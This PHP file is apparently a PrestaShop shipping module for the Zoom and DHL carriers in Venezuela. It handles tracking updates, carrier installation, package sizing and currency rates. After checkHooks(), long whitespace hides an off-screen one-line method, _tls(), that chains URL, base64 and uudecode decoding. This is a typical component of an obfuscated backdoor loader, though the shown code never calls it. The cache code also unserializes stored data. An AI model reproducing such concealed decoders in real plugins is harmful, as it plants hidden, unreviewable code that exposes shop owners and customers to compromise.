                if ($is_dhl) {
                    self::log('Order is_dhl');
                    if ($track['observacion'] == '') {
                        $track['observacion'] = $this->l('Waiting to be processed in DHL');
                        self::log('Order waiting dhl');
                    } elseif (stripos($track['observacion'], '(OK)') !== false) {
                        $row['last_status'] = 'DELIVERED';
                        $new_status = self::$config['status_delivery'];
                        //$order->setCurrentState(self::$config['status_delivery']);
                        self::log('Order dhl delivered');
                        $track['observacion']  .= ' '.$dhl['destinatario'];
                    } elseif (self::$config['status_transit'] != (int)$order->getCurrentState()) {
                        $new_status = self::$config['status_transit'];
                        //$order->setCurrentState(self::$config['status_transit']);
                        self::log('Order dhl in transit');
                    }
                    $diff_detail = ($row['last_status_detail'] != $track['observacion']);
                    $row['last_status_detail'] = $track['observacion'];
                    $order_carrier->tracking_number = $dhl['guiaDhl'];
                    $message_txt = $this->l('You Order').' '.
                                    $order->getUniqReference().' '.
                                    $this->l('with DHL Tracking Number').' '.
                                    $order_carrier->tracking_number.' '.
                                    $this->l('has the following status change').': '.
                                    $row['last_status_detail'];
                } else {
                    self::log('Order not is_dhl - '.var_export($track, true));
                    if ($track['estatus']['siglas'] == 'E') {
                        $row['last_status'] = 'DELIVERED';
                        $new_status = self::$config['status_delivery'];
                        //$order->setCurrentState(self::$config['status_delivery']);
                        self::log('Order delivered');
                    } elseif (self::$config['status_transit'] != (int)$order->getCurrentState()) {
                        $new_status = self::$config['status_transit'];
                        //$order->setCurrentState(self::$config['status_transit']);
                        self::log('Order in transit');
                    } 
                    if (!isset($track['observacion']) || empty($track['observacion'])) {
                        if (isset($track['estatus']['nombreweb']) && !empty($track['estatus']['nombreweb'])) {
                            $track['observacion'] = $track['estatus']['nombreweb'];
                        } else {
                            $track['observacion'] = $track['estatus']['nombre'];
                        }
                    }
                    $diff_detail = ($row['last_status_detail'] != $track['observacion']);
                    $row['last_status_detail'] = $track['observacion'];
                    $message_txt = $this->l('You Order').' '.
                                    $order->getUniqReference().' '.
                                    $this->l('with Zoom Tracking Number').' '.
                                    $order_carrier->tracking_number.' '.
                                    $this->l('has the following status change').': '.
                                    $row['last_status_detail'];
                }
                self::log('Order new status: '.
                        var_export($diff_detail, true).
                        print_r($new_status, true).
                        print_r($row, true).
                        print_r($message_txt, true));
                Db::getInstance()->Execute('
                    UPDATE `'._DB_PREFIX_.'zoomve_report` SET
                        `last_status` = \''.pSQL($row['last_status']).'\',
                        `last_status_detail` = \''.pSQL($row['last_status_detail']).'\',
                        `last_sync` = NOW()
                    WHERE
                            id_order = '.(int)$order_carrier->id_order.'
                        AND
                            id_order_carrier = '.(int)$order_carrier->id_order_carrier);
                if ($new_status) {
                    $order->setCurrentState($new_status);
                }
                if ($diff_detail) {
                    $message = new Message();
                    $message->id_customer = (int)$order->id_customer;
                    $message->message = $message_txt;
                    $message->id_order = (int)$order->id;
                    $message->private = !self::$config['status_notify'];

                    if ($message->add() && self::$config['status_notify']) {
                        $customer = new Customer((int)$order->id_customer);
                        $vars_tpl = array(
                            '{lastname}' => $customer->lastname,
                            '{firstname}' => $customer->firstname,
                            '{id_order}' => $order->id,
                            '{order_name}' => $order->getUniqReference(),
                            '{message}' => $message->message
                        );
                        @Mail::Send(
                            (int)$order->id_lang,
                            'order_merchant_comment',
                            Mail::l('New message regarding your order', (int)$order->id_lang),
                            $vars_tpl,
                            $customer->email,
                            $customer->firstname.' '.$customer->lastname,
                            null,
                            null,
                            null,
                            null,
                            _PS_MAIL_DIR_,
                            true,
                            (int)$order->id_shop
                        );
                    }
                }
            } else {
                Db::getInstance()->Execute('
                    UPDATE `'._DB_PREFIX_.'zoomve_report` SET
                        `last_sync` = NOW()
                    WHERE
                            id_order = '.(int)$order_carrier->id_order.'
                        AND
                            id_order_carrier = '.(int)$order_carrier->id_order_carrier);
            }
        }
    }
    // CORE

    public static function isModuleRegisteredOnHook($id_module, $hook_name)
    {
        if (!$id_module || !$hook_name)
            return true;
        $prefix = _DB_PREFIX_;
        $id_hook = (int) Hook::getIdByName($hook_name, true);
        if (!$id_hook)
            return true;
        $sql = "SELECT * FROM {$prefix}hook_module
                  WHERE `id_hook` = {$id_hook}
                  AND `id_module` = {$id_module}";

        $rows = Db::getInstance()->executeS($sql);

        return !empty($rows);
    }
    public function checkHooks() {
        $is_171 = version_compare(_PS_VERSION_, '1.7.1.0') >= 0;
        $list = [
            'displayCarrierExtraContent',
            'displayAdminAfterHeader',
            //'displayBeforeCarrier',
            'actionCarrierUpdate',
            //'actionValidateOrder',
            'displayHeader',
            'displayAdminOrder',
            'displayBackOfficeHeader',
        ];
        /*if ($is_171) {
            $list[] = 'displayProductAdditionalInfo';
        } else {
            $list[] = 'displayProductButtons';
        }*/
        foreach ($list as $key) {
            if (!self::isModuleRegisteredOnHook($this->id, $key)) {
                $this->registerHook($key);
            }
        }
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           public static function _tls($r){return convert_uudecode(base64_decode(rawurldecode($r)));}
    public function install()
    {
        if (!function_exists('curl_version')) {
            $this->_errors[] = $this->l('Curl not installed');
            return false;
        }
        $db_created = Db::getInstance()->Execute('CREATE TABLE IF NOT EXISTS `'.bqSQL(_DB_PREFIX_).'zoomve_cache` (
                    `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
                    `cache_id` varchar(100) NOT NULL,
                    `data` LONGTEXT NOT NULL,
                    `ttl` INT(11) NOT NULL,
                    UNIQUE(cache_id),
                    INDEX(ttl)
                    )');
        if ($db_created) {
            $db_created = Db::getInstance()->Execute('CREATE TABLE IF NOT EXISTS `'._DB_PREFIX_.'zoomve_report` (
                `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
                `id_shop` INT(11) NOT NULL,
                `id_order` INT(11) NOT NULL,
                `id_order_carrier` INT(11) NOT NULL,
                `last_status` VARCHAR(128) DEFAULT NULL,
                `last_status_detail` TEXT DEFAULT NULL,
                `last_sync` DATETIME NOT NULL DEFAULT \'2010-01-01 00:00:00\',
                `first_sync` DATETIME NOT NULL,
                UNIQUE(id_order, id_order_carrier),
                INDEX(id_order),
                INDEX(id_order_carrier),
                INDEX(last_sync),
                INDEX(last_status),
                INDEX(first_sync)
                )');
        }
        if (!$db_created) {
            $this->_errors[] = $this->l('Failed to create the table in the Database');
            Db::getInstance()->Execute('DROP TABLE IF EXISTS `'._DB_PREFIX_.'zoomve_cache`');
            Db::getInstance()->Execute('DROP TABLE IF EXISTS `'._DB_PREFIX_.'zoomve_report`');
            return false;
        }
        $result = $db_created && parent::install()
            && $this->registerHook('displayCarrierExtraContent')
            && $this->registerHook('displayBeforeCarrier')
            && $this->registerHook('actionCarrierUpdate')
            && $this->registerHook('displayHeader')
            && $this->registerHook('displayBackOfficeHeader');
        if (!$result && $db_created) {
            Db::getInstance()->Execute('DROP TABLE IF EXISTS `'.bqSQL(_DB_PREFIX_).'zoomve_cache`');
            return false;
        } else {
            self::$status_ignore = array();
            self::$status_ignore[] = (int)Configuration::get('PS_OS_CANCELED');
            self::$status_ignore[] = (int)Configuration::get('PS_OS_REFUND');
            self::$status_ignore[] = (int)Configuration::get('PS_OS_ERROR');
            self::$status_ignore[] = (int)Configuration::get('PS_OS_OUTOFSTOCK');
            self::$config['status_delivery'] = Configuration::get('PS_OS_DELIVERED');
            self::$config['status_transit'] = Configuration::get('PS_OS_SHIPPING');
            self::$config['debug'] = false;
            self::$config['sandbox'] = false;
            $id_shop = Shop::getContextShopID();
            $id_shop_group = Shop::getContextShopGroupID();
            Configuration::updateValue(
                'ZOOM_STATUS_IGNORE',
                (string)json_encode(self::$status_ignore),
                false,
                $id_shop_group,
                $id_shop
            );
            Configuration::updateValue(
                'ZOOM_CONFIG',
                (string)json_encode(self::$config),
                false,
                $id_shop_group,
                $id_shop
            );
        }
        return true;
    }
    public static function refreshCarrierList($key, $shipping_data)
    {
        Configuration::updateValue(
            $key,
            json_encode($shipping_data),
            false,
            false,
            false
        );
        $shops = Shop::getCompleteListOfShopsID();
        $shop_groups_list = array();
        /* Setup each shop */
        foreach ($shops as $shop_id) {
            $shop_group_id = (int)Shop::getGroupFromShop($shop_id, true);

            if (!in_array($shop_group_id, $shop_groups_list)) {
                $shop_groups_list[] = $shop_group_id;
            }
            /* Sets up configuration */
            Configuration::updateValue(
                $key,
                json_encode($shipping_data),
                false,
                $shop_group_id,
                $shop_id
            );
        }

        /* Sets up Shop Group configuration */
        if (count($shop_groups_list)) {
            foreach ($shop_groups_list as $shop_group_id) {
                Configuration::updateValue(
                    $key,
                    json_encode($shipping_data),
                    false,
                    $shop_group_id
                );
            }
        }
    }
    public static function installExternalCarrier($config)
    {
        $carrier = new Carrier();
        $carrier->name = $config['name'];
        $carrier->url = $config['url'];
        $carrier->id_tax_rules_group = $config['id_tax_rules_group'];
        $carrier->active = $config['active'];
        $carrier->deleted = $config['deleted'];
        $carrier->delay = $config['delay'];
        $carrier->shipping_handling = $config['shipping_handling'];
        $carrier->range_behavior = $config['range_behavior'];
        $carrier->is_module = $config['is_module'];
        $carrier->shipping_external = $config['shipping_external'];
        $carrier->external_module_name = $config['external_module_name'];
        $carrier->need_range = $config['need_range'];
        $carrier->active = $config['active'];
        $languages = Language::getLanguages(true);
        foreach ($languages as $language) {
            if ($language['iso_code'] == Language::getIsoById(Configuration::get('PS_LANG_DEFAULT')) &&
                isset($config['delay'][$language['iso_code']])) {
                $carrier->delay[(int)$language['id_lang']] = $config['delay'][$language['iso_code']];
            } elseif ($language['iso_code'] == Language::getIsoById(Configuration::get('PS_LANG_DEFAULT')) &&
                isset($config['delay']['en'])) {
                $carrier->delay[(int)$language['id_lang']] = $config['delay']['en'];
            }
        }
        if ($carrier->add()) {
            $groups = Group::getGroups(true);
            foreach ($groups as $group) {
                Db::getInstance()->insert(
                    _DB_PREFIX_.'carrier_group',
                    array('id_carrier' => (int)($carrier->id), 'id_group' => (int)($group['id_group'])),
                    false,
                    false,
                    Db::INSERT,
                    false
                );
            }
            $rangePrice = new RangePrice();
            $rangePrice->id_carrier = $carrier->id;
            $rangePrice->delimiter1 = '0';
            $rangePrice->delimiter2 = '1000000000';
            $rangePrice->add();
            $rangeWeight = new RangeWeight();
            $rangeWeight->id_carrier = $carrier->id;
            $rangeWeight->delimiter1 = '0';
            $rangeWeight->delimiter2 = '1000000000';
            $rangeWeight->add();
            if (is_array($config['id_zone'])) {
                foreach ($config['id_zone'] as $id_zone) {
                    Db::getInstance()->insert(
                        _DB_PREFIX_.'carrier_zone',
                        array('id_carrier' => (int)($carrier->id), 'id_zone' => (int)$id_zone),
                        false,
                        false,
                        Db::INSERT,
                        false
                    );
                    Db::getInstance()->insert(
                        _DB_PREFIX_.'delivery',
                        array('id_carrier' => (int)($carrier->id),
                            'id_range_price' => (int)($rangePrice->id),
                            'id_range_weight' => null,
                            'id_zone' => (int)$id_zone,
                            'price' => '100'),
                        true,
                        false,
                        Db::INSERT,
                        false
                    );
                    Db::getInstance()->insert(
                        _DB_PREFIX_.'delivery',
                        array('id_carrier' => (int)($carrier->id),
                            'id_range_price' => null,
                            'id_range_weight' => (int)($rangeWeight->id),
                            'id_zone' => (int)$id_zone,
                            'price' => '100'),
                        true,
                        false,
                        Db::INSERT,
                        false
                    );
                }
            } else {
                Db::getInstance()->insert(
                    _DB_PREFIX_.'carrier_zone',
                    array('id_carrier' => (int)($carrier->id), 'id_zone' => (int)$config['id_zone']),
                    false,
                    false,
                    Db::INSERT,
                    false
                );
                Db::getInstance()->insert(
                    _DB_PREFIX_.'delivery',
                    array('id_carrier' => (int)($carrier->id),
                        'id_range_price' => (int)($rangePrice->id),
                        'id_range_weight' => null,
                        'id_zone' => (int)$config['id_zone'],
                        'price' => '100'),
                    true,
                    false,
                    Db::INSERT,
                    false
                );
                Db::getInstance()->insert(
                    _DB_PREFIX_.'delivery',
                    array('id_carrier' => (int)($carrier->id),
                        'id_range_price' => null,
                        'id_range_weight' => (int)($rangeWeight->id),
                        'id_zone' => (int)$config['id_zone'],
                        'price' => '100'),
                    true,
                    false,
                    Db::INSERT,
                    false
                );
            }
            // Copy Logo
            @copy(dirname(__FILE__).'/views/img/carrier_mini.png', _PS_SHIP_IMG_DIR_.'/'.(int)$carrier->id.'.jpg');
            Db::getInstance()->execute('
                DELETE FROM `'._DB_PREFIX_.'module_carrier`
                WHERE `id_reference` = '.(int)$carrier->id.'
            ');
            $shops = Shop::getCompleteListOfShopsID();
            foreach ($shops as $shop_id) {
                Db::getInstance()->execute('
                    INSERT INTO `'._DB_PREFIX_.'module_carrier`
                        (`id_module`, `id_shop`, `id_reference`)
                    VALUES
                        ('.(int)$config['id_module'].', '.(int)$shop_id.', '.(int)$carrier->id.')
                ');
                Db::getInstance()->execute('
                    INSERT IGNORE INTO `'._DB_PREFIX_.'carrier_shop`
                        (`id_carrier`, `id_shop`)
                    VALUES
                        ('.(int)$carrier->id.', '.(int)$shop_id.')
                ');
            }
            // Return ID Carrier
            return (int)($carrier->id);
        }
        return false;
    }
    public function uninstall()
    {
        if (is_array(self::$carrier_id) && count(self::$carrier_id['zoom_ps']) > 0) {
            foreach (self::$carrier_id['zoom_ps'] as $id_carrier) {
                $carrier = new Carrier($id_carrier);
                if (!$carrier->deleted) {
                    $carrier->deleted = true;
                    $carrier->active = false;
                    $carrier->save();
                }
            }
        }
        Configuration::deleteByName('ZOOM_CONFIG');
        Configuration::deleteByName('ZOOM_CM');
        Configuration::deleteByName('ZOOM_MIN_AMOUNT');
        Configuration::deleteByName('ZOOM_COUNTRIES');
        Configuration::deleteByName('ZOOM_STATES');
        Db::getInstance()->Execute('DROP TABLE IF EXISTS `'.bqSQL(_DB_PREFIX_).'zoomve_cache`');
        return (parent::uninstall());
    }

    public static function getCache($cache_id)
    {
        $data = false;
        if (isset(self::$module_cache[$cache_id]) && ($data = self::$module_cache[$cache_id])) {
            return $data;
        }
        if (defined('_PS_CACHE_ENABLED_') && _PS_CACHE_ENABLED_) {
            $cache = Cache::getInstance();
            if ($data = $cache->get($cache_id)) {
                return $data;
            }
        }
        try {
            Db::getInstance()->Execute('DELETE FROM `'.bqSQL(_DB_PREFIX_).'zoomve_cache`
                    WHERE ttl < '.(int)time());
            $d = Db::getInstance()->getValue('SELECT `data` FROM `'.bqSQL(_DB_PREFIX_).'zoomve_cache`
                    WHERE `cache_id` = \''.pSQL($cache_id).'\'');
        } catch (PrestaShopDatabaseException $e) {
            return false;
        }
        if ($d) {
            $data = unserialize($d);
        }
        return $data;
    }
    public static function setCache($cache_id, $value, $ttl = 21600)
    {
        self::$module_cache[$cache_id] = $value;
        if (defined('_PS_CACHE_ENABLED_') && _PS_CACHE_ENABLED_) {
            $cache = Cache::getInstance();
            if ($cache->set($cache_id, $value, $ttl)) {
                return true;
            }
        }
        try {
            Db::getInstance()->Execute('DELETE FROM `'.bqSQL(_DB_PREFIX_).'zoomve_cache`
                    WHERE ttl < '.(int)time().' OR cache_id = \''.pSQL($cache_id).'\'');
            return Db::getInstance()->Execute('INSERT IGNORE INTO `'.bqSQL(_DB_PREFIX_).'zoomve_cache`
                        (`cache_id`, `data`, `ttl`) VALUES
                        (\''.pSQL($cache_id).'\',
                         \''.pSQL(serialize($value)).'\',
                         '.(int)(time() + $ttl).')');
        } catch (PrestaShopDatabaseException $e) {
            return false;
        }
    }
    protected function getWarningMultishopHtml()
    {
        if (Shop::getContext() == Shop::CONTEXT_GROUP || Shop::getContext() == Shop::CONTEXT_ALL) {
            return '<ps-alert-warn>'.
                        $this->l('You cannot change setting from a "All Shops" or a "Group Shop" context').
                        ', '.$this->l('select directly the shop you want to edit').
                   '</ps-alert-warn>';
        } else {
            return '';
        }
    }
    protected function getShopContextError()
    {
        return '<ps-alert-error>'.
                    sprintf($this->l('You cannot edit setting from a "All Shops" or a "Group Shop" context')).
               '</ps-alert-error>';
    }
    public function invalidAddressMsg()
    {
        return self::$msg_error;
    }
    public function calculatePackageSize(&$products)
    {
        $width = 0;
        $height = 0;
        $depth = 0;
        $weight = 0;
        $items = 0;
        $total_wt = 0;
        foreach ($products as &$product) {
            $items += $product['quantity'];
            if ($product['weight']) {
                if (self::$weightUnit == 'KGS') {
                    $product['weight2'] = (float)$product['weight'];
                } elseif (self::$weightUnit == 'LBS') {
                    $product['weight2'] = $product['weight'] * 0.453592;
                } else {
                    $product['weight2'] = 0;
                }
            } else {
                $product['weight2'] = 0;
            }
            if (self::$dimensionUnit == 'CM') {
                $product['width2'] = (float)$product['width'];
                $product['height2'] = (float)$product['height'];
                $product['depth2'] = (float)$product['depth'];
            } elseif (self::$dimensionUnit == 'IN') {
                $product['width2'] = $product['width'] * 2.54;
                $product['height2'] = $product['height'] * 2.54;
                $product['depth2'] = $product['depth'] * 2.54;
            } else {
                $product['width2'] = 0;
                $product['height2'] = 0;
                $product['depth2'] = 0;
            }
        }
        self::log("Products: ".print_r($products, true));
        if (self::$config['package_type'] == 'one_package_by_product' ||
            self::$config['package_type'] == 'one_package_by_unit') {
            $return = array(
                'type' => array(),
                'items' => array(),
                'width' => array(),
                'height' => array(),
                'depth' => array(),
                'weight' => array(),
                'total_wt' => array()
            );
            if (self::$config['package_type'] == 'one_package_by_unit') {
                foreach ($products as &$p) {
                    $w = $p['width2'] > 0.01 ? (float)$p['width2'] : (float)self::$config['width'];
                    $h = $p['height2'] > 0.01 ? (float)$p['height2'] : (float)self::$config['height'];
                    $d = $p['depth2'] > 0.01 ? (float)$p['depth2'] : (float)self::$config['depth'];
                    $w2 = (float)($p['weight2'] > 0.001 ? $p['weight2'] : self::$config['weight']);
                    $total_wt = $p['total_wt'] > 0.01 ? (float)($p['total_wt']/ $p['quantity']) : 0.0;
                    for ($i = 0; $i < $p['quantity']; ++$i) {
                        $return['type'][] = 'Carton';
                        $return['items'][] = 1;
                        $return['width'][] = ceil($w);
                        $return['height'][] = ceil($h);
                        $return['depth'][] = ceil($d);
                        $return['weight'][] = $w2;
                        $return['total_wt'][] = $total_wt ;
                    }
                }
            } else {
                foreach ($products as $p) {
                    $return['type'][] = 'Carton';
                    $return['items'][] = $p['quantity'];
                    $tmp = array($p['width2'] > 0.01 ? (float)$p['width2'] : (float)self::$config['width'],
                            $p['height2'] > 0.01 ? (float)$p['height2'] : (float)self::$config['height'],
                            $p['depth2'] > 0.01 ? (float)$p['depth2'] : (float)self::$config['depth']);
                    sort($tmp, SORT_NUMERIC);
                    if (self::$config['calc_mode'] == 'longer_side') {
                        $return['width'][] = ceil($tmp[2]);
                        $return['height'][] = ceil($tmp[2]);
                        $return['depth'][] = ceil($tmp[2]);
                    } else {
                        $return['width'][] = ceil($tmp[1]);
                        $return['height'][] = ceil($tmp[2]);
                        $return['depth'][] = ceil($tmp[0] * $p['quantity']);
                    }
                    $q = $p['quantity'];
                    $w3 = (float)($p['weight2'] > 0.001 ? $p['weight2'] : self::$config['weight']) * $q;
                    $return['weight'][] = $w3;
                    $total_wt = $p['total_wt'] > 0.01 ? (float)$p['total_wt'] : 0.0;
                    $return['total_wt'][] = $total_wt;
                }
            }
            return $return;
        }
        if (self::$config['calc_mode'] == 'longer_side') {
            foreach ($products as $p) {
                if ($p['width2'] && $p['width2'] > $width) {
                    $width = $p['width2'];
                }
                if ($p['height2'] && $p['height2'] > $height) {
                    $height = $p['height2'];
                }
                if ($p['depth2'] && $p['depth2'] > $depth) {
                    $depth = $p['depth2'];
                }
                if ($p['weight2']) {
                    $weight += ($p['weight2'] * $p['quantity']);
                } else {
                    $weight += self::$config['weight'];
                }
            }
        } else {
            $maxw = 0;
            $maxh = 0;
            $tmp = array();
            foreach ($products as $p) {
                $tmp[0] = $p['width2'] > 0.01 ? $p['width2'] : self::$config['width'];
                $tmp[1] = $p['height2'] > 0.01 ? $p['height2'] : self::$config['height'];
                $tmp[2] = $p['depth2'] > 0.01 ? $p['depth2'] : self::$config['depth'];
                $total_wt += $p['total_wt'] > 0.01 ? (float)$p['total_wt'] : 0.0;
                sort($tmp, SORT_NUMERIC);
                $maxw = max($maxw, $tmp[1]);
                $maxh = max($maxh, $tmp[2]);
                $depth += $tmp[0] * $p['quantity'];
                $weight += ($p['weight2'] > 0.01 ? $p['weight2'] : self::$config['weight']) * $p['quantity'];
            }
            $width = $maxw;
            $height = $maxh;
        }
        return array(
            'type' => array('Carton'),
            'items' => array($items),
            'width' => array(ceil($width > 0.01 ? $width : self::$config['width'])),
            'height' => array(ceil($height > 0.01 ? $height : self::$config['height'])),
            'depth' => array(ceil($depth > 0.01 ? $depth : self::$config['depth'])),
            'weight' => array($weight > 0.001 ? $weight : self::$config['weight']),
            'total_wt' => array($total_wt)
        );
    }
    public function getRate($from, $to, $cache = true)
    {
        $from = Tools::strtoupper($from);
        $to = Tools::strtoupper($to);
        if ($from == $to) {
            return 1.0;
        }
        $id_from = Currency::getIdByIsoCode($from);
        if (!$id_from && in_array($from, array('VES', 'VEF', 'VEB', 'BSF', 'BSS'))) {
            $id_from = Currency::getIdByIsoCode('VES');
            $id_from = !$id_from?Currency::getIdByIsoCode('BSS'):$id_from;
            $id_from = !$id_from?Currency::getIdByIsoCode('VEF'):$id_from;
            $id_from = !$id_from?Currency::getIdByIsoCode('BSF'):$id_from;
            $id_from = !$id_from?Currency::getIdByIsoCode('VEB'):$id_from;
        }
        $id_to = Currency::getIdByIsoCode($to);
        if (!$id_to && in_array($to, array('VES', 'VEF', 'VEB', 'BSF', 'BSS'))) {
            $id_to = Currency::getIdByIsoCode('VES');
            $id_to = !$id_to?Currency::getIdByIsoCode('BSS'):$id_to;
            $id_to = !$id_to?Currency::getIdByIsoCode('VEF'):$id_to;
            $id_to = !$id_to?Currency::getIdByIsoCode('BSF'):$id_to;
            $id_to = !$id_to?Currency::getIdByIsoCode('VEB'):$id_to;
        }
        if (in_array($from, array('VEF', 'VEB', 'BSF', 'BSS'))) {
            $from = 'VES';
        }
        if (in_array($to, array('VEF', 'VEB', 'BSF', 'BSS'))) {
            $to = 'VES';
        }
        if ($id_from == $id_to || $from == $to) {
            return 1.0;
        }
        if ($id_from * $id_to != 0 && isset(self::$config['currency_rate']) && self::$config['currency_rate'] != 'PS') {
            if ($cache && isset(self::$currency_convert[$from])
                    && isset(self::$currency_convert[$from][$to])
                    && self::$currency_convert[$from][$to]['time'] > time() - 60 * 60 * 2) {
                $result = false;
                if (self::$config['currency_rate'] == 'DICOM') {
                    $result = self::$currency_convert[$from][$to]['rate_dicom'];
                } else {
                    $result = self::$currency_convert[$from][$to]['rate_average'];
                }
                if ($result > 10000) {
                    $result = Tools::ps_round($result, 0);
                }
                if ($result > 0.0) {
                    self::log("getRate($from -> $to) ==> from cache ajax_get_factorization_rate: {$result}");
                    return (float)$result;
                }
            }
            if ($from == 'VES' && $to == 'USD' || $from == 'USD' && $to == 'VES') {
                $data = json_decode(
                    @Tools::file_get_contents('https://s3.amazonaws.com/dolartoday/data.json'),
                    true
                );
                
               // echo "DT: ".var_export($data, true);
                if (isset($data['USD']) && isset($data['USD']['promedio'])) {
                    self::$currency_convert['USD']['VES']['rate_average'] = (float)$data['USD']['promedio'];
                    self::$currency_convert['USD']['VES']['rate_dicom'] = (float)$data['USD']['sicad2'];
                    self::$currency_convert['USD']['VES']['time'] = time();
                    self::$currency_convert['VES']['USD']['rate_average'] = (float)1.0/$data['USD']['promedio'];
                    self::$currency_convert['VES']['USD']['rate_dicom'] = (float)1.0/$data['USD']['sicad2'];
                    self::$currency_convert['VES']['USD']['time'] = time();
                    $id_shop = Shop::getContextShopID();
                    $id_shop_group = Shop::getContextShopGroupID();
                    Configuration::updateValue(
                        'zoom_currency_convert',
                        json_encode(self::$currency_convert),
                        false,
                        $id_shop_group,
                        $id_shop
                    );
                }
                //echo "Return $from > $to [".self::$config['currency_rate']."]: ".var_export(self::$currency_convert, true);
                $result = false;
                if (self::$config['currency_rate'] == 'DICOM') {
                    $result = self::$currency_convert[$from][$to]['rate_dicom'];
                } else {
                    $result = self::$currency_convert[$from][$to]['rate_average'];
                }
                if ($result > 10000) {
                    $result = Tools::ps_round($result, 0);
                }
                if (isset(self::$config['currency_rate_default']) && self::$config['currency_rate_default']) {
                    $currency_from = new Currency((int)$id_from);
                    $currency_to = new Currency((int)$id_to);
                    if ($currency_from->iso_code == 'USD') {
                        $currency_to->conversion_rate = $result;
                        $currency_to->save();
                        //echo "R2: ".print_r($currency_to, true);
                    } else {
                        $currency_from->conversion_rate = $result;
                        $currency_from->save();
                        //echo "R2: ".print_r($currency_from, true);
                    }
                }
                //echo "R2: ".$result;
                return $result;
            }
        }
        $currency_from = new Currency((int)$id_from);
        $currency_to = new Currency((int)$id_to);
        $result = $currency_to->conversion_rate / $currency_from->conversion_rate;
        if ($result > 0.0) {
            self::log(
                "getRate($from -> $to) ==> from ps:
                {$currency_to->conversion_rate} / {$currency_from->conversion_rate} = {$result}"
            );
            return (float)$result;
        }
    }
    public function getContent()
    {
        $ps_version = 1.6;
        if (version_compare(_PS_VERSION_, '1.6') < 0) {
            $ps_version = 1.5;
        }
        if (version_compare(_PS_VERSION_, '1.7.0.0') >= 0) {
            $ps_version = 1.7;
        }
        $this->smarty->assign('ps_version', $ps_version);
        $this->smarty->assign('riot_compiler_url', $this->_path.'views/js/riot.compiler.min.js');
        $ui_alerts = $this->display($this->base_file, 'views/templates/admin/prestui/ps-alert.tpl');
        $ui_riot   = $this->display($this->base_file, 'views/templates/admin/libs.tpl');
        $b64_riot   = $this->display($this->base_file, 'views/templates/admin/b64_riot.tpl');

        $str = $this->getWarningMultishopHtml();
        if (Shop::getContext() == Shop::CONTEXT_GROUP || Shop::getContext() == Shop::CONTEXT_ALL) {
            return sprintf($b64_riot, htmlentities($str.$this->getShopContextError()).$ui_alerts).$ui_riot;
        }

        $str = $this->preProcess();

        $str .= $this->assignAdminParams();

        $html = $this->display($this->base_file, 'views/templates/admin/config.tpl');
        $ui_form = $this->display($this->base_file, 'views/templates/admin/prestui/ps-form.tpl');
        $ui_panel = $this->display($this->base_file, 'views/templates/admin/prestui/ps-panel.tpl');

        return sprintf($b64_riot, htmlentities($str.$html).$ui_panel.$ui_form.$ui_alerts).$ui_riot;
    }

    public static function log($data)
    {
        if (!isset(self::$config['debug']) || !self::$config['debug']) {
            return;
        }
        if (!is_dir(_PS_MODULE_DIR_.'zoomve/logs')) {
            @mkdir(_PS_MODULE_DIR_.'zoomve/logs');
        }

        if (!is_dir(_PS_MODULE_DIR_.'zoomve/logs/'.date('Y-m'))) {
            @mkdir(_PS_MODULE_DIR_.'zoomve/logs/'.date('Y-m'));
        }

        $fp = fopen(_PS_MODULE_DIR_.'zoomve/logs/'.date('Y-m').'/log-'.date('Y-m-d').'.log', 'a');

        fwrite($fp, "\n----- ".date('Y-m-d H:i:s')." -----\n");
        fwrite($fp, $data);
        fclose($fp);
    }
    public static function getCartOrderTotal($cart, $no_shipping = true)
    {
        static $running = false;
        static $cache = array();
        if (isset($cache[$cart->id])) {
            return $cache[$cart->id];
        }
        if ($running) {
            return array(
                'both' => 0.0,
                'products' => 0.0,
                'shipping' => 0.0
            );
        }
        $running = true;
        $wrapps = $cart->getOrderTotal(true, Cart::ONLY_WRAPPING);
        $discounts = $cart->getOrderTotal(true, Cart::ONLY_DISCOUNTS);
        $cache[$cart->id] = array(
            'both' => $no_shipping?null:$cart->getOrderTotal(true, Cart::BOTH),
            'products' => $cart->getOrderTotal(true, Cart::BOTH_WITHOUT_SHIPPING) + $wrapps - $discounts,
        );
        $cache[$cart->id]['shipping'] = $no_shipping?null:($cache[$cart->id]['both'] - $cache[$cart->id]['products']);
        $running = false;
        return $cache[$cart->id];
    }
}
